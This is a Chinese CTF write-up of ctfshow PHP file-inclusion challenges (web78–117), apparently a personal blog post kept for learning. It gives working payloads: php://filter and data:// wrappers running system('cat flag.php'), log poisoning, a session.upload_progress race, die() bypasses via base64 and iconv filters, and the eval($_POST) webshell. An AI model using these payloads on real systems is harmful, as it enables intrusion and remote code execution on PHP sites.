---
title: ctfshow web入门(文件包含)
categories: ctfshow
---
## web78（伪协议）
知识点：
- php伪协议

>Payload: ?file=php://filter/read=convert.base64-encode/resource=flag.php
<!--more-->
---
## web79（伪协议）
知识点：
- php伪协议

>Payload: ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=

>PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===> <?php system('cat flag.php');
 
 System函数 


执行外部程序并显示输出资料。

system语法: string system(string $command, int [return_var]);

system返回值: 字符串

函数种类: 操作系统与环境

```bash
<?php
echo '<pre>';

// 输出 shell 命令 "ls" 的返回结果
// 并且将输出的最后一样内容返回到 $last_line。
// 将命令的返回值保存到 $retval。
$last_line = system('ls', $retval);


```
---
## web80-81（包含日志）
知识点：
- 包含日志

[日志包含](https://www.cnblogs.com/my1e3/p/5854897.html)

首先源码告诉我们部分协议被禁止，：也被禁止，所以新姿势，通过包含 日志文件 

原理：当我们没有上传点，并且也没有url_allow_include功能时，我们就可以考虑包含服务器的日志文件。        利用思路也比较简单，当我们访问网站时，服务器的日志中都会记录我们的行为，当我们访问链接中包含PHP一句话木马时，也会被记录到日志中。知道服务器的日志位置，我们可以去包含这个文件从而拿到shell。其实整个“包含日志文件漏洞利用”最关键的就是找日志存放的“物理路径”，只要找到日志的物理存放路径，一切就可以按部就班的完成利用了。

题目给了日志文件位置，使用bp，写入一句话，连接

![](https://img-blog.csdnimg.cn/2021012919143578.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

![](https://img-blog.csdnimg.cn/20210129191542189.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
亦可写入<?php system(‘ls’);?> 再次写入<?php system(‘cat fl0g.php’);?>

![](https://img-blog.csdnimg.cn/20210129191644835.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## web82-86（session.upload_progress+条件竞争）
知识点：

- 利用`session.upload_progress`进行文件包含
- 条件竞争

看我的这篇博客：LFI绕过Session包含限制 
[利用session.upload_progress进行文件包含和反序列化渗透](https://www.freebuf.com/vuls/202819.html)

![](https://img-blog.csdnimg.cn/20210129192028430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
通过观察代码，可以看到过滤了大部分的文件包含函数，这里我们利用`PHP_SESSION_UPLOAD_PROGRESS`加`条件竞争`进行文件包含

```bash
<!DOCTYPE html>
<html>
<body>
<form action="http://d1e5ba13-d4cd-440b-8e4e-166a9e202418.chall.ctf.show/" method="POST" enctype="multipart/form-data">
<input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="2333" />
<input type="file" name="file" />
<input type="submit" value="submit" />
</form>
</body>
</html>

```
创建为html

![](https://img-blog.csdnimg.cn/20210129192125678.png#pic_center)
进入后以post方式提交文件，格式随意，我提交一个.txt文件

![](https://img-blog.csdnimg.cn/20210129192148208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
抓包

![](https://img-blog.csdnimg.cn/2021012919223864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
这里我们添加一个 `Cookie :PHPSESSID=cys` ，PHP将会在服务器上创建一个文件：/tmp/sess_cys” （这里我们猜测session文件默认存储位置为/tmp），并在PHP_SESSION_UPLOAD_PROGRESS下添加恶意代码，修改如下

![](https://img-blog.csdnimg.cn/20210129192326280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
发送到爆破并设置为不断发送

![](https://img-blog.csdnimg.cn/20210129192341653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
我们再去访问调用包含文件的界面

![](https://img-blog.csdnimg.cn/20210129192407996.png#pic_center)
抓包

![](https://img-blog.csdnimg.cn/20210129192420737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
设置为不断爆破

综上两个方式一个post一个get开始不断发送
查看返回结果

![](https://img-blog.csdnimg.cn/20210129192454785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
发现fl0g.php
将ls改为cat

![](https://img-blog.csdnimg.cn/20210129192513733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## web87（file_put_content）
知识点：
- file_put_content 绕过死亡代码

[谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)
[file_put_content和死亡·杂糅代码之缘](https://xz.aliyun.com/t/8163#toc-11)
[探索php://filter在实战当中的奇技淫巧](https://www.anquanke.com/post/id/202510#h3-5)


![](https://img-blog.csdnimg.cn/20210129193004620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)



![](https://img-blog.csdnimg.cn/20210129193012409.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
将content参数的值写入到urldecode的file参数所定义的文件里，但是一同写入的还有die，导致即使我们成功写入一句话，也执行不了，所以我们要想法绕过die，去执行我们所写入的一句话，

我们使用base64-decode
将 php://filter/write=convert.base64-decode/resource=123.php （这里因为我们需要的是写入的权限，所以是write）进行两次url编码

```bash
%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%31%25%33%32%25%33%33%25%32%45%25%37%30%25%36%38%25%37%30
```

![](https://img-blog.csdnimg.cn/20210129193248374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

然后再content写入经过base64编码过后的一句话 <?php @eval($_POST[a]);?>（PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==）
这里content的值前面要加两个字符，因为base64算法解码时是4个byte一组，前面还剩phpdie 6个字符，所以给他增加2个字符 一共8个字符

此时我们可以蚁剑

![](https://img-blog.csdnimg.cn/20210129193334469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)


或者我们进入123.php，再post我们的a=system(‘base64 fl0g.pgp’);


![](https://img-blog.csdnimg.cn/20210129193350256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## web88（伪协议）
知识点：

- php伪协议

![](https://img-blog.csdnimg.cn/20210129193539486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
没有过滤 `：`  使用?file=data://text/plain;base64, PD9waHAgc3lzdGVtKCdiYXNlNjQgZmwwZy5waHAnKTsgPz4

---
## web117（convert.iconv）
知识点：

- php伪协议 filter中的 convert.iconv.

[file_put_content和死亡·杂糅代码之缘](https://xz.aliyun.com/t/8163#toc-11)
[探索php://filter在实战当中的奇技淫巧](https://www.anquanke.com/post/id/202510#h3-5)

![](https://img-blog.csdnimg.cn/20210129193907928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

![](https://img-blog.csdnimg.cn/20210129193914417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Payload:  file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php
 post:contents=?<hp pvela$(P_SO[T]1;)>?


---
## 参考
[file_put_content和死亡·杂糅代码之缘](https://xz.aliyun.com/t/8163#toc-11)
[探索php://filter在实战当中的奇技淫巧](https://www.anquanke.com/post/id/202510#h3-5)
[谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)
[日志包含](https://www.cnblogs.com/my1e3/p/5854897.html)


